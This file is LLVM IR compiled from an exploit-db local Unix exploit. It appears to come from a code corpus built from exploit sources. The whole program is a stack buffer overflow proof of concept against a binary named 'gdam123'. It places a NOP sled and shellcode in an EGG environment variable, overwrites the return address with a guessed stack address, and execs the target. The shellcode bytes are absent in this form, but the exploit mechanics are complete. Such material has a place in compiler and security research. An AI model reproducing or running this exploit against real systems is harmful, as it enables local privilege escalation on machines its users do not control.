; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21760.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21760.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFLEN = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.1 = private unnamed_addr constant [45 x i8] c"gdam123 proof of concept exploit by sacrine\0A\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"ret: 0x%x\0A\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"buf: %d\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"gdam123\00", align 1
@.str.5 = private unnamed_addr constant [15 x i8] c"gdam123_hacked\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca [1024 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 3221221520, i64* %6, align 8
  %13 = load i32, i32* @BUFLEN, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %7, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %8, align 8
  store i32 0, i32* %11, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp sgt i32 %17, 1
  br i1 %18, label %19, label %26

19:                                               ; preds = %2
  %20 = load i64, i64* %6, align 8
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = call i64 @atol(i8* %23)
  %25 = sub i64 %20, %24
  store i64 %25, i64* %6, align 8
  br label %26

26:                                               ; preds = %19, %2
  %27 = load i32, i32* @NOP, align 4
  %28 = trunc i64 %14 to i32
  %29 = call i32 @memset(i8* %16, i32 %27, i32 %28)
  %30 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  store i8* %30, i8** %10, align 8
  store i32 0, i32* %11, align 4
  br label %31

31:                                               ; preds = %41, %26
  %32 = load i32, i32* %11, align 4
  %33 = load i8*, i8** @shellcode, align 8
  %34 = call i32 @strlen(i8* %33)
  %35 = sub nsw i32 1024, %34
  %36 = sub nsw i32 %35, 1
  %37 = icmp slt i32 %32, %36
  br i1 %37, label %38, label %44

38:                                               ; preds = %31
  %39 = load i8*, i8** %10, align 8
  %40 = getelementptr inbounds i8, i8* %39, i32 1
  store i8* %40, i8** %10, align 8
  store i8 -112, i8* %39, align 1
  br label %41

41:                                               ; preds = %38
  %42 = load i32, i32* %11, align 4
  %43 = add nsw i32 %42, 1
  store i32 %43, i32* %11, align 4
  br label %31

44:                                               ; preds = %31
  store i32 0, i32* %11, align 4
  br label %45

45:                                               ; preds = %58, %44
  %46 = load i32, i32* %11, align 4
  %47 = load i8*, i8** @shellcode, align 8
  %48 = call i32 @strlen(i8* %47)
  %49 = icmp slt i32 %46, %48
  br i1 %49, label %50, label %61

50:                                               ; preds = %45
  %51 = load i8*, i8** @shellcode, align 8
  %52 = load i32, i32* %11, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %10, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %10, align 8
  store i8 %55, i8* %56, align 1
  br label %58

58:                                               ; preds = %50
  %59 = load i32, i32* %11, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %11, align 4
  br label %45

61:                                               ; preds = %45
  %62 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 1023
  store i8 0, i8* %62, align 1
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %64 = call i32 @memcpy(i8* %63, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 4)
  %65 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %66 = call i32 @putenv(i8* %65)
  %67 = trunc i64 %14 to i32
  %68 = call i32 @memset(i8* %16, i32 65, i32 %67)
  %69 = load i64, i64* %6, align 8
  %70 = and i64 %69, 255
  %71 = trunc i64 %70 to i8
  %72 = load i32, i32* @BUFLEN, align 4
  %73 = sub nsw i32 %72, 5
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8, i8* %16, i64 %74
  store i8 %71, i8* %75, align 1
  %76 = load i64, i64* %6, align 8
  %77 = and i64 %76, 65280
  %78 = lshr i64 %77, 8
  %79 = trunc i64 %78 to i8
  %80 = load i32, i32* @BUFLEN, align 4
  %81 = sub nsw i32 %80, 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %16, i64 %82
  store i8 %79, i8* %83, align 1
  %84 = load i64, i64* %6, align 8
  %85 = and i64 %84, 16711680
  %86 = lshr i64 %85, 16
  %87 = trunc i64 %86 to i8
  %88 = load i32, i32* @BUFLEN, align 4
  %89 = sub nsw i32 %88, 3
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %16, i64 %90
  store i8 %87, i8* %91, align 1
  %92 = load i64, i64* %6, align 8
  %93 = and i64 %92, 4278190080
  %94 = lshr i64 %93, 24
  %95 = trunc i64 %94 to i8
  %96 = load i32, i32* @BUFLEN, align 4
  %97 = sub nsw i32 %96, 2
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8, i8* %16, i64 %98
  store i8 %95, i8* %99, align 1
  %100 = load i32, i32* @BUFLEN, align 4
  %101 = sub nsw i32 %100, 1
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %16, i64 %102
  store i8 0, i8* %103, align 1
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0))
  %105 = load i64, i64* %6, align 8
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i64 %105)
  %107 = call i32 @strlen(i8* %16)
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i32 %107)
  %109 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0), i8* %16, i32* null)
  store i32 0, i32* %3, align 4
  %110 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %110)
  %111 = load i32, i32* %3, align 4
  ret i32 %111
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @atol(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @putenv(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
